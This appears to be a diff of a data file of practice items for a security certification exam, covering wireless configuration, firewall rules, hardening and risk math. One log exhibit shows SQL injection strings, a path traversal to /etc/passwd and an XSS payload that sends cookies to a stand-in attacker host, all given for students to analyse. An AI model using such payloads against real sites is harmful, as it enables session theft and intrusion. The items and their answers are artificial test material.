@@ -19,7 +19,7 @@ a: [
   prompt:"Set the fields the ticket names and nothing else.",device:"AP-HS-LIB-02",deviceSub:"Student wireless profile",
   task:["SSID District-Students on both bands.","Every Chromebook carries a device certificate from the district CA; students must authenticate with that certificate, not a password.","Use the strongest security mode that supports per-device authentication; RADIUS server 10.20.0.15, port 1812, shared secret Lib3rty-Owl-4471.","Students must not be able to reach one another's devices over the wireless network."],
   start:{ssid:"District-Students",hidden:false,band:"2.4 + 5 GHz",mode:"WPA2-Personal",psk:"students2024",eap:"PEAP (MSCHAPv2)",radiusHost:"",radiusPort:"1645",radiusSecret:"",pmf:"Required",wps:false,macFilter:"Off",isolation:false,mgmtWifi:false,adminDefault:"Changed to a unique strong password"},
-  want:{mode:"WPA3-Enterprise",eap:"EAP-TLS",radiusHost:"10.20.0.15",radiusPort:"1812",radiusSecret:"Lib3rty-Owl-4471",isolation:true},
+  want:{mode:["WPA3-Enterprise","WPA3-Enterprise 192-bit"],eap:"EAP-TLS",radiusHost:"10.20.0.15",radiusPort:"1812",radiusSecret:"Lib3rty-Owl-4471",isolation:true},
   fieldWhy:{eap:"Certificate on the client = EAP-TLS. PEAP/EAP-TTLS carry a password inside the TLS tunnel.",isolation:"Client isolation stops peer-to-peer traffic on the SSID, so one infected Chromebook cannot scan the rest."},
   why:"Device certificates → EAP-TLS over WPA3-Enterprise with RADIUS. Client isolation for untrusted peers. A shared passphrase would mean one leaked password for the whole district."},
  {id:"pa3",obj:"1.4",type:"hashid",d:1,cat:"crypto",title:"Identify the hash",prompt:"Read the digest, name the algorithm, give its bit length.",task:["Count the characters and note the encoding (hex or Base64).","Pick the algorithm that produces a digest of that length.","Enter the digest length in bits."]},
@@ -84,7 +84,7 @@ b: [
    {id:"hostfw",g:"base",l:"Host firewall",t:"toggle",start:true,crit:true,why:"It enforces the RDP source restriction; nothing asked you to turn it off."}
   ],
   why:"OT hardening: no dual-homing, no radios, no removable media, least privilege, remote access from one VLAN, patches in the outage window. Availability of the production link is non-negotiable."},
- {id:"pb3",obj:"3.2",type:"fwrule",d:3,cat:"netsec",title:"Firewall rule evaluation",prompt:"Walk the rule table top-down for the packet shown.",task:["Compare the packet's source, destination and port against each rule from the top.","Stop at the first rule where all three match; that rule's action applies.","If nothing matches, the implicit deny at the bottom applies."]},
+ {id:"pb3",obj:"4.5",type:"fwrule",d:4,cat:"ops",title:"Firewall rule evaluation",prompt:"Walk the rule table top-down for the packet shown.",task:["Compare the packet's source, destination and port against each rule from the top.","Stop at the first rule where all three match; that rule's action applies.","If nothing matches, the implicit deny at the bottom applies."]},
  {id:"pb4",obj:"2.4",type:"exhibit",d:2,cat:"attacks",title:"Exhibit: web server log",
   setup:"A cloud startup's web application firewall is in monitor-only mode. The access log shows these requests from one client in under a minute.",
   out:"203.0.113.77 GET /login?user=admin'--&pass=x                       200\n203.0.113.77 GET /login?user=admin' OR '1'='1&pass=x               200\n203.0.113.77 GET /search?q=<script>document.location='http://evil.example/c?'+document.cookie</script> 200\n203.0.113.77 GET /files?name=../../../../etc/passwd                 403\n203.0.113.77 GET /api/orders?id=1000                                200\n203.0.113.77 GET /api/orders?id=1001                                200\n203.0.113.77 GET /api/orders?id=1002                                200",
@@ -98,7 +98,7 @@ b: [
  {id:"pb5",obj:"5.2",type:"risk",d:5,cat:"gov",title:"Risk math: SLE, ALE, cost-benefit",prompt:"Compute the loss figures and decide whether the control is worth buying.",task:["SLE = asset value × exposure factor.","ALE = SLE × ARO (events per year).","The control is justified when the ALE it removes exceeds its annual cost. The calculator is in this pane."]}
 ],
 c: [
- {id:"pc1",obj:"4.5",d:4,cat:"harden",type:"hardening",title:"MSP: harden a client's file server",
+ {id:"pc1",obj:"4.1",d:4,cat:"harden",type:"hardening",title:"MSP: harden a client's file server",
   prompt:"Apply the MSP's server baseline to the client's file server. Users must still reach their shares.",host:{name:"CLI-FS01",os:"Windows Server 2019",role:"File server for 40 staff over SMB; managed by the MSP through its RMM agent and RDP from the MSP management VPN (10.99.0.0/24)"},
   task:["Staff must keep reaching their shares; the MSP must keep its RMM agent and its RDP path from the management VPN.","Remove the unused FTP role, the Guest account, SMBv1 and the two name-resolution protocols that enable credential relay (LLMNR, NetBIOS over TCP/IP).","Shares must not grant Everyone full control. Forward security logs to the MSP SIEM.","Updates must install automatically and the host firewall must be on."],
   groups:[{id:"svc",label:"Roles & services"},{id:"net",label:"Network access"},{id:"acct",label:"Accounts & permissions"},{id:"base",label:"Baseline & logging"}],
